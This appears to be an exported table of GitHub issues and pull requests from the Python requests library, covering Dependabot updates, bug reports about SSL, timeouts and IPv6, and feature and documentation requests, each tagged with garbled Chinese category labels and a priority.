<li><a href=""https://github.com/github/codeql-action/commit/1aa16c2c36f41e9ce531bdcd2aa834171700e48d""><code>1aa16c2</code></a> Merge branch 'main' into update-bundle/codeql-bundle-v2.20.1</li>
<li><a href=""https://github.com/github/codeql-action/commit/fb65b6ce7884900fde5b15518bec92ad6875180e""><code>fb65b6c</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2672"">#2672</a> from github/mbg/start-proxy/include-type-in-urls-output</li>
<li>Additional commits viewable in <a href=""https://github.com/github/codeql-action/compare/662472033e021d55d94146f66f6058822b0b39fd...b6a472f63d85b9c78a3ac5e89422239fc15e9b3c"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=github/codeql-action&package-manager=github_actions&previous-version=3.27.0&new-version=3.28.1)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜, æ€§èƒ½é—®é¢˜",é«˜,https://github.com/psf/requests/pull/6870
2781740701,Please add support for the `QUERY` HTTP method,"On 2025-01-07 the [`QUERY` HTTP method, ""a safe, idempotent request method that can carry request content."" has reached the level of a Proposed Standard](https://datatracker.ietf.org/doc/draft-ietf-httpbis-safe-method-w-body/).

It solves the problem of making complex queries where the GET method is sometimes sufficient as it (according to the standard) lacks support for sending the query in the body, leaving only the query part of the URL which is limited. An often used workaround of using the POST method has a downside in that it's just the wrong method for this purpose as queries do not cause side-effects and this limits the retryabilty and cacheability of such queries.

Therefore It would be great to implement support for QUERY in Requests.

If you are open to it, I am interested in providing a PR.","åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6869
2779161829,`import requests` intermittently fails on windows server 2022,"<!-- Summary. -->

I have an error on a miniconda based python3.11 installation on Windows Server 2022 where `import requests` fails intermittently for one of my apps. It seems to be an SSL verification issue as far as I can tell.

## Expected Result

I expected the `requests` library to successfully load. 

## Actual Result

`import requests` fails with the following stack trace:

```
Traceback (most recent call last):
  File ""C:\ProjectName\APPS\py-mysvc\deployed\src\app.py"", line 29, in <module>
    import mysvc_models
  File ""C:\ProjectName\APPS\py-mysvc\deployed\src\mysvc_models.py"", line 9, in <module>
    import mysvc_utils
  File ""C:\ProjectName\APPS\py-mysvc\deployed\src\mysvc_utils.py"", line 17, in <module>
    import requests
  File ""C:\ProjectName\ENV\py-mysvc\Lib\site-packages\requests\__init__.py"", line 164, in <module>
    from .api import delete, get, head, options, patch, post, put, request
  File ""C:\ProjectName\ENV\py-mysvc\Lib\site-packages\requests\api.py"", line 11, in <module>
    from . import sessions
  File ""C:\ProjectName\ENV\py-mysvc\Lib\site-packages\requests\sessions.py"", line 15, in <module>
    from .adapters import HTTPAdapter
  File ""C:\ProjectName\ENV\py-mysvc\Lib\site-packages\requests\adapters.py"", line 81, in <module>
    _preloaded_ssl_context.load_verify_locations(
ssl.SSLError: [X509] PEM lib (_ssl.c:4154)
```

Matching this stack trace to the openssl version I have available leads me to `SSL_CTX_load_verify_locations` but I'm unable to debug the issue further. 

## Reproduction Steps

I'm unable to consistently reproduce it but it fails at this step. 
```python
import requests
```

## System Information

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.3.2""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.11.6""
  },
  ""platform"": {
    ""release"": ""10"",
    ""system"": ""Windows""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30300020""
  },
  ""urllib3"": {
    ""version"": ""2.2.3""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```
Relevant conda packages:
```
# Name                    Version                   Build  Channel
ca-certificates           2024.9.24            haa95532_0
certifi                   2024.8.30       py311haa95532_0
cffi                      1.17.1          py311h827c3e9_0
h11                       0.14.0          py311haa95532_0
h2                        4.1.0              pyhd8ed1ab_0    conda-forge
hpack                     4.0.0                      py_0
httpcore                  1.0.6              pyhd8ed1ab_0    conda-forge
httpx                     0.27.2             pyhd8ed1ab_0    conda-forge
openssl                   3.3.2                h2466b09_0    conda-forge
python                    3.11.6          h2628c8c_0_cpython    conda-forge
python-certifi-win32      1.2             py311h1ea47a8_6    conda-forge
python_abi                3.11                    5_cp311    conda-forge
pywin32                   306             py311h12c1d0e_2    conda-forge
wincertstore              0.2             py311haa95532_0
```
<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/issues/6868
2770686043,"Problem Error Download failed : HTTPSConnectionPool(host='swcdn.apple.com',port=443): Read timed out. Opencore legacy patcher 2.2.0","Hello and happy new year !


I don't know if it's a bug, or something I'm doing wrong when installing Ventura on my Macbook Pro Mid 2021 9.1 - i7 Quadcore 2.3ghz, 16GB Ram 1866Mhz, SSD Samsung Evo 860 - 512gb. I had managed to install it almost 2 years ago except that in the meantime I wanted to put Sonoma, but it must not be compatible with my applications! Pixelmator, Liquivid, Denon Engine DJ Desktop and Open Office... I didn't have this problem with Ventura. 

So I put my Mac back with the latest compatible OSX and then I tried to install Opencore Legacy Patcher 2.2.0, so far no problem! But then... when I want to download Ventura it crashes at 50% of the download I have an error message:
Error Download failed : HTTPSConnectionPool(host='swcdn.apple.com',port=443): Read timed out.

![Capture dâ€™Ã©cran 2025-01-06 Ã  01 47 34](https://github.com/user-attachments/assets/9eab0cab-584a-4620-886b-480cce6e890f)

So either I forgot a step, after installing the Opencore software, or you need an OSX older than Catalina to be able to continue the installation steps ??? Thanks in advance for any help!

Greetings, Patrick.","Bugåé¦ˆ, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥",é«˜,https://github.com/psf/requests/issues/6867
2766933655,Adding host details in proxy headers,"**Issue:**
The connect request does not include host details when operating in a proxy environment. This can lead to failures in establishing a proper connection, as the host information is essential for routing the request through the proxy.

**Code Explanation:**
To address this issue, the following approach is used:

Check for Host in Proxy Settings:
If the proxy_kwargs dictionary contains a host key, it indicates that host details are available.

Add Host to Proxy Headers:
These host details are added to the proxy_headers dictionary under the Host key. By doing so, the host information is explicitly included in the proxy headers, ensuring that the connect request incorporates the correct routing details.

Impact:
Including the host details in the proxy_headers ensures that the connect request is properly formed and able to route through the proxy environment without any missing information. This resolves the issue and enhances connectivity reliability","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/pull/6866
2765144068,Update docstring for Session.verify to include string support (#6859),"This pull request updates the docstring for the `Session.verify` attribute to clarify that it supports a string value for custom CA bundle paths.

Closes #6859.
","åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6865
2762493263,Add example for handling timeouts in advanced.rst,This PR adds an example for handling timeouts using the timeout parameter in the Requests library.,"åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6864
2759313914,issue resolve - 6653 document uploaded of exceptions from request(),"Detailed document uploaded for exception raise by request() 

This will help for python developers who working upon request() module ","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6863
2757901970,Timeout Issue When Scraping Emails from Multiple URLs Using Python requests,"I am working on a web scraping project using Python's `requests` library. The goal is to scrape emails from numerous URLs. To handle network delays, I set the timeout parameter as `timeout=(10, 10)`.

However, when I run the script for multiple URLs, I encounter an issue where the program gets stuck on a request and does not respect the timeout settings. This results in the script hanging indefinitely, especially when scraping a large number of URLs.

Hereâ€™s the code snippet Iâ€™m using:

```
import requests  

urls = [  
    ""http://example.com"",  
    ""http://anotherexample.com"",  
    # ... more URLs  
]  
HEADERS={""user-agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36""}
for url in urls:  
    try:  
        response = requests.get(url, headers=HEADERS, timeout=(10, 10))  
        if response.status_code == 200:  
            # Extract emails (simplified for demonstration)  
            print(f""Emails from {url}: "", response.text)  
    except requests.exceptions.Timeout:  
        print(f""Timeout occurred for {url}"")  
    except requests.exceptions.RequestException as e:  
        print(f""Error occurred for {url}: {e}"")  
```


Despite using the timeout parameter, the script sometimes gets stuck indefinitely and doesnâ€™t proceed to the next URL.

**Steps Taken**:
1. Tried reducing the timeout values to (5, 5) but encountered the same issue.
Ensured that the URLs are valid and accessible.

**My Questions**:
1. Why might the timeout not work as expected in this case?

2. How can I ensure that the script doesn't hang indefinitely when scraping a large number of URLs?

Any help or suggestions to resolve this issue would be greatly appreciated.

**Environment**:

Python version: 3.10.10

requests version: 2.32.3","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6862
2756341901,Bump github/codeql-action from 3.27.0 to 3.28.0,"Bumps [github/codeql-action](https://github.com/github/codeql-action) from 3.27.0 to 3.28.0.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/github/codeql-action/releases"">github/codeql-action's releases</a>.</em></p>
<blockquote>
<h2>v3.28.0</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<p>Note that the only difference between <code>v2</code> and <code>v3</code> of the CodeQL Action is the node version they support, with <code>v3</code> running on node 20 while we continue to release <code>v2</code> to support running on node 16. For example <code>3.22.11</code> was the first <code>v3</code> release and is functionally identical to <code>2.22.11</code>. This approach ensures an easy way to track exactly which features are included in different versions, indicated by the minor and patch version numbers.</p>
<h2>3.28.0 - 20 Dec 2024</h2>
<ul>
<li>Bump the minimum CodeQL bundle version to 2.15.5. <a href=""https://redirect.github.com/github/codeql-action/pull/2655"">#2655</a></li>
<li>Don't fail in the unusual case that a file is on the search path. <a href=""https://redirect.github.com/github/codeql-action/pull/2660"">#2660</a>.</li>
</ul>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.28.0/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
<h2>v3.27.9</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<p>Note that the only difference between <code>v2</code> and <code>v3</code> of the CodeQL Action is the node version they support, with <code>v3</code> running on node 20 while we continue to release <code>v2</code> to support running on node 16. For example <code>3.22.11</code> was the first <code>v3</code> release and is functionally identical to <code>2.22.11</code>. This approach ensures an easy way to track exactly which features are included in different versions, indicated by the minor and patch version numbers.</p>
<h2>3.27.9 - 12 Dec 2024</h2>
<p>No user facing changes.</p>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.27.9/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
<h2>v3.27.7</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<p>Note that the only difference between <code>v2</code> and <code>v3</code> of the CodeQL Action is the node version they support, with <code>v3</code> running on node 20 while we continue to release <code>v2</code> to support running on node 16. For example <code>3.22.11</code> was the first <code>v3</code> release and is functionally identical to <code>2.22.11</code>. This approach ensures an easy way to track exactly which features are included in different versions, indicated by the minor and patch version numbers.</p>
<h2>3.27.7 - 10 Dec 2024</h2>
<ul>
<li>We are rolling out a change in December 2024 that will extract the CodeQL bundle directly to the toolcache to improve performance. <a href=""https://redirect.github.com/github/codeql-action/pull/2631"">#2631</a></li>
<li>Update default CodeQL bundle version to 2.20.0. <a href=""https://redirect.github.com/github/codeql-action/pull/2636"">#2636</a></li>
</ul>
<p>See the full <a href=""https://github.com/github/codeql-action/blob/v3.27.7/CHANGELOG.md"">CHANGELOG.md</a> for more information.</p>
<h2>v3.27.6</h2>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<p>Note that the only difference between <code>v2</code> and <code>v3</code> of the CodeQL Action is the node version they support, with <code>v3</code> running on node 20 while we continue to release <code>v2</code> to support running on node 16. For example <code>3.22.11</code> was the first <code>v3</code> release and is functionally identical to <code>2.22.11</code>. This approach ensures an easy way to track exactly which features are included in different versions, indicated by the minor and patch version numbers.</p>
<h2>3.27.6 - 03 Dec 2024</h2>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/github/codeql-action/blob/main/CHANGELOG.md"">github/codeql-action's changelog</a>.</em></p>
<blockquote>
<h1>CodeQL Action Changelog</h1>
<p>See the <a href=""https://github.com/github/codeql-action/releases"">releases page</a> for the relevant changes to the CodeQL CLI and language packs.</p>
<p>Note that the only difference between <code>v2</code> and <code>v3</code> of the CodeQL Action is the node version they support, with <code>v3</code> running on node 20 while we continue to release <code>v2</code> to support running on node 16. For example <code>3.22.11</code> was the first <code>v3</code> release and is functionally identical to <code>2.22.11</code>. This approach ensures an easy way to track exactly which features are included in different versions, indicated by the minor and patch version numbers.</p>
<h2>[UNRELEASED]</h2>
<p>No user facing changes.</p>
<h2>3.28.0 - 20 Dec 2024</h2>
<ul>
<li>Bump the minimum CodeQL bundle version to 2.15.5. <a href=""https://redirect.github.com/github/codeql-action/pull/2655"">#2655</a></li>
<li>Don't fail in the unusual case that a file is on the search path. <a href=""https://redirect.github.com/github/codeql-action/pull/2660"">#2660</a>.</li>
</ul>
<h2>3.27.9 - 12 Dec 2024</h2>
<p>No user facing changes.</p>
<h2>3.27.8 - 12 Dec 2024</h2>
<ul>
<li>Fixed an issue where streaming the download and extraction of the CodeQL bundle did not respect proxy settings. <a href=""https://redirect.github.com/github/codeql-action/pull/2624"">#2624</a></li>
</ul>
<h2>3.27.7 - 10 Dec 2024</h2>
<ul>
<li>We are rolling out a change in December 2024 that will extract the CodeQL bundle directly to the toolcache to improve performance. <a href=""https://redirect.github.com/github/codeql-action/pull/2631"">#2631</a></li>
<li>Update default CodeQL bundle version to 2.20.0. <a href=""https://redirect.github.com/github/codeql-action/pull/2636"">#2636</a></li>
</ul>
<h2>3.27.6 - 03 Dec 2024</h2>
<ul>
<li>Update default CodeQL bundle version to 2.19.4. <a href=""https://redirect.github.com/github/codeql-action/pull/2626"">#2626</a></li>
</ul>
<h2>3.27.5 - 19 Nov 2024</h2>
<p>No user facing changes.</p>
<h2>3.27.4 - 14 Nov 2024</h2>
<p>No user facing changes.</p>
<h2>3.27.3 - 12 Nov 2024</h2>
<p>No user facing changes.</p>
<h2>3.27.2 - 12 Nov 2024</h2>
<ul>
<li>Fixed an issue where setting up the CodeQL tools would sometimes fail with the message &quot;Invalid value 'undefined' for header 'authorization'&quot;. <a href=""https://redirect.github.com/github/codeql-action/pull/2590"">#2590</a></li>
</ul>
<h2>3.27.1 - 08 Nov 2024</h2>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/github/codeql-action/commit/48ab28a6f5dbc2a99bf1e0131198dd8f1df78169""><code>48ab28a</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2662"">#2662</a> from github/update-v3.28.0-d01b25e64</li>
<li><a href=""https://github.com/github/codeql-action/commit/4946b765dee77596c258fee1bc1f8c5a86cb45a2""><code>4946b76</code></a> Update changelog for v3.28.0</li>
<li><a href=""https://github.com/github/codeql-action/commit/d01b25e645295d11d0fbb084a8c5e7546b1e508b""><code>d01b25e</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2660"">#2660</a> from github/henrymercer/fix-error-file-on-path</li>
<li><a href=""https://github.com/github/codeql-action/commit/7d6d36ce5f3654bed1de7eb8600c22e3a12910a4""><code>7d6d36c</code></a> Add changelog note</li>
<li><a href=""https://github.com/github/codeql-action/commit/b58f4471c8015d1581e4112c33316a6b04ace55f""><code>b58f447</code></a> Use <code>@actions/io</code> to locate binaries</li>
<li><a href=""https://github.com/github/codeql-action/commit/64cc90bcd4b0a6919309f7882f920e60de2aef1c""><code>64cc90b</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2653"">#2653</a> from github/dependabot/npm_and_yarn/npm-61c837125e</li>
<li><a href=""https://github.com/github/codeql-action/commit/d8f8eca6c5448bea9fbfb5a16bcdc9ecc5c4305d""><code>d8f8eca</code></a> Merge branch 'main' into dependabot/npm_and_yarn/npm-61c837125e</li>
<li><a href=""https://github.com/github/codeql-action/commit/562042d742d834fa44c4fd29c197a62d76568c60""><code>562042d</code></a> Merge pull request <a href=""https://redirect.github.com/github/codeql-action/issues/2655"">#2655</a> from github/aeisenberg/deprecate-2.14</li>
<li><a href=""https://github.com/github/codeql-action/commit/beed6ff2e94aa8b13c7e8c50b7cb642f82855e37""><code>beed6ff</code></a> Change codeql version used in test</li>
<li><a href=""https://github.com/github/codeql-action/commit/5f0a4d3e67a0f3cb983e0e664a6408ccf8866999""><code>5f0a4d3</code></a> Bump the minimum supported version of CodeQL to 2.15.5</li>
<li>Additional commits viewable in <a href=""https://github.com/github/codeql-action/compare/662472033e021d55d94146f66f6058822b0b39fd...48ab28a6f5dbc2a99bf1e0131198dd8f1df78169"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=github/codeql-action&package-manager=github_actions&previous-version=3.27.0&new-version=3.28.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜, æ€§èƒ½é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6861
2748394944,"""No address associated with hostname"" when querying IPv6 hosts","## Expected Result

```
$ python                       
Python 3.12.3 (main, Nov  6 2024, 18:32:19) [GCC 13.2.0] on linux
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> import requests
>>> requests.get(""https://ipv6.icanhazip.com/"").text
'2001:920:[REDACTED]'
```

## Actual Result

```shell
$ python                       
Python 3.12.3 (main, Nov  6 2024, 18:32:19) [GCC 13.2.0] on linux
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> import requests
>>> requests.get(""https://ipv6.icanhazip.com/"").text
Traceback (most recent call last):
  File ""/home/user/tool/venv/lib/python3.12/site-packages/urllib3/connection.py"", line 199, in _new_conn
    sock = connection.create_connection(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/user/tool/venv/lib/python3.12/site-packages/urllib3/util/connection.py"", line 60, in create_connection
    for res in socket.getaddrinfo(host, port, family, socket.SOCK_STREAM):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/usr/lib/python3.12/socket.py"", line 963, in getaddrinfo
    for res in _socket.getaddrinfo(host, port, family, type, proto, flags):
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
socket.gaierror: [Errno -5] No address associated with hostname

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File ""/home/user/tool/venv/lib/python3.12/site-packages/urllib3/connectionpool.py"", line 789, in urlopen
    response = self._make_request(
               ^^^^^^^^^^^^^^^^^^^
  File ""/home/user/tool/venv/lib/python3.12/site-packages/urllib3/connectionpool.py"", line 490, in _make_request
    raise new_e
  File ""/home/user/tool/venv/lib/python3.12/site-packages/urllib3/connectionpool.py"", line 466, in _make_request
    self._validate_conn(conn)
  File ""/home/user/tool/venv/lib/python3.12/site-packages/urllib3/connectionpool.py"", line 1095, in _validate_conn
    conn.connect()
  File ""/home/user/tool/venv/lib/python3.12/site-packages/urllib3/connection.py"", line 693, in connect
    self.sock = sock = self._new_conn()
                       ^^^^^^^^^^^^^^^^
  File ""/home/user/tool/venv/lib/python3.12/site-packages/urllib3/connection.py"", line 206, in _new_conn
    raise NameResolutionError(self.host, self, e) from e
urllib3.exceptions.NameResolutionError: <urllib3.connection.HTTPSConnection object at 0x7c2522dfe180>: Failed to resolve 'ipv6.icanhazip.com' ([Errno -5] No address associated with hostname)

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File ""/home/user/tool/venv/lib/python3.12/site-packages/requests/adapters.py"", line 667, in send
    resp = conn.urlopen(
           ^^^^^^^^^^^^^
  File ""/home/user/tool/venv/lib/python3.12/site-packages/urllib3/connectionpool.py"", line 843, in urlopen
    retries = retries.increment(
              ^^^^^^^^^^^^^^^^^^
  File ""/home/user/tool/venv/lib/python3.12/site-packages/urllib3/util/retry.py"", line 519, in increment
    raise MaxRetryError(_pool, url, reason) from reason  # type: ignore[arg-type]
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='ipv6.icanhazip.com', port=443): Max retries exceeded with url: / (Caused by NameResolutionError(""<urllib3.connection.HTTPSConnection object at 0x7c2522dfe180>: Failed to resolve 'ipv6.icanhazip.com' ([Errno -5] No address associated with hostname)""))

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/home/user/tool/venv/lib/python3.12/site-packages/requests/api.py"", line 73, in get
    return request(""get"", url, params=params, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/user/tool/venv/lib/python3.12/site-packages/requests/api.py"", line 59, in request
    return session.request(method=method, url=url, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/user/tool/venv/lib/python3.12/site-packages/requests/sessions.py"", line 589, in request
    resp = self.send(prep, **send_kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/user/tool/venv/lib/python3.12/site-packages/requests/sessions.py"", line 703, in send
    r = adapter.send(request, **kwargs)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/user/tool/venv/lib/python3.12/site-packages/requests/adapters.py"", line 700, in send
    raise ConnectionError(e, request=request)
requests.exceptions.ConnectionError: HTTPSConnectionPool(host='ipv6.icanhazip.com', port=443): Max retries exceeded with url: / (Caused by NameResolutionError(""<urllib3.connection.HTTPSConnection object at 0x7c2522dfe180>: Failed to resolve 'ipv6.icanhazip.com' ([Errno -5] No address associated with hostname)""))
```

## Reproduction Steps

```python
import requests
requests.get(""https://ipv6.icanhazip.com/"").text
```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.3.2""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.7""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.12.3""
  },
  ""platform"": {
    ""release"": ""6.8.0-50-generic"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""300000d0""
  },
  ""urllib3"": {
    ""version"": ""2.2.3""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```

installed versions (OS is Ubuntu 24)

```shell
$ pip list | grep urllib       
urllib3            2.2.3
$ pip list | grep requests
requests           2.32.3
```


Network (I have a fully functional IPv6 setup)

```shell
$ ping -6 google.com
PING google.com (2a00:1450:4007:810::200e) 56 data bytes
64 bytes from par10s50-in-x0e.1e100.net (2a00:1450:4007:810::200e): icmp_seq=1 ttl=120 time=1.49 ms
64 bytes from par10s50-in-x0e.1e100.net (2a00:1450:4007:810::200e): icmp_seq=2 ttl=120 time=1.81 ms
64 bytes from par10s50-in-x0e.1e100.net (2a00:1450:4007:810::200e): icmp_seq=3 ttl=120 time=1.54 ms
64 bytes from par10s50-in-x0e.1e100.net (2a00:1450:4007:810::200e): icmp_seq=4 ttl=120 time=2.08 ms
64 bytes from par10s50-in-x0e.1e100.net (2a00:1450:4007:810::200e): icmp_seq=5 ttl=120 time=1.81 ms
^C
--- google.com ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 1.491/1.745/2.082/0.213 ms
$ curl -6 ipv6.icanhazip.com  
2001:920:[REDACTED]
```
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ€§èƒ½é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6860
2743511913,Documentation: Session docstring for verify attribute should note that it supports a string value.,"<!-- Summary. -->

`Session` docstring for `verify` attribute should note that it supports a string value.

<!-- What you expected. -->

## Actual Result

Currently, the `Session` docstring notes that its `verify` attribute only supports a bool.

However, `session.request` supports a string for its `verify` arg: https://github.com/psf/requests/blob/main/src/requests/sessions.py#L550

and when a `verify` arg isn't passed to `session.request`, then `session.verify` is used instead: 

https://github.com/psf/requests/blob/main/src/requests/sessions.py#L776
https://github.com/psf/requests/blob/main/src/requests/sessions.py#L70

## Reproduction Steps

N/A

## System Information
N/A

","åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6859
2741775749,Unable to remove default content-length header field,"The server I'm requesting from needs to remove the content-length field in order to properly respond to the data, but after I try to del session.headers['content-length'] , when I re-initiate the request, the request header adds the field again,how do I fix this?","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/issues/6858
2740422329,HTTP/2,"I am trying to get HTTP/2 with requests, and I found these:

> It can: http://hyper.readthedocs.org/en/development/quickstart.html#requests-integration

https://github.com/psf/requests/issues/2082#issuecomment-44869333

> There is no roadmap for this. HTTP/2 is a complex protocol and it is not likely that Requests in its current form will achieve good support for it any time soon. In the meantime, you can [use this](//hyper.readthedocs.org/en/development/quickstart.html#requests-integration).

https://github.com/psf/requests/issues/3601#issuecomment-249818864

> hyper is a possible Python alternative. I believe they still support using the Requests interface over the top of their H2 stack.

https://github.com/psf/requests/issues/5506#issuecomment-646712595

the problem is that Hyper is archived now:

https://github.com/python-hyper/hyper

and further, it does not support Python 3.10 (2021) or higher
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",é«˜,https://github.com/psf/requests/issues/6856
2739269541,Response history is wrong ,"History for requests with multiple redirects is incorrect.

## Expected Result

Correct history in history of each request

## Actual Result

second request has itself in the history

## Reproduction Steps

```python

In [2]: import requests
